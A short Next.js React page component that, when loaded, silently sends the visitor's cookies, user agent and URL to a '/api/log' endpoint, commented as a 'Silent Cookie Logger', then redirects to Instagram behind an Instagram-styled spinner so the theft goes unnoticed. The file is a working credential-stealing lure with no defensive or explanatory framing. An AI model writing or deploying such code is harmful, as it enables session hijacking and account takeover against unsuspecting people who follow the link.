''use client';

import { useEffect } from 'react';
import { useRouter } from 'next/navigation';

export default function ProxyPage() {
  const router = useRouter();

  useEffect(() => {
    // 1. Silent Cookie Logger
    // We send a POST request to log the cookies without blocking the redirect
    navigator.sendBeacon('/api/log', JSON.stringify({
      cookies: document.cookie,
      ua: navigator.userAgent,
      url: window.location.href
    }));

    // 2. Redirect to Instagram
    window.location.href = "https://www.instagram.com/";
  }, []);

  // Optional: Show a tiny spinner so it doesn't flash white
  return (
    <div style={{
      display: 'flex', 
      justifyContent: 'center', 
      alignItems: 'center', 
      height: '100vh', 
      backgroundColor: '#fafafa'
    }}>
      <div style={{
        width: '30px',
        height: '30px',
        border: '3px solid #dbdbdb',
        borderTop: '3px solid #0095f6',
        borderRadius: '50%',
        animation: 'spin 1s linear infinite'
      }} />
      <style jsx>{`
        @keyframes spin {
          0% { transform: rotate(0deg); }
          100% { transform: rotate(360deg); }
        }
      `}</style>
    </div>
  );
}
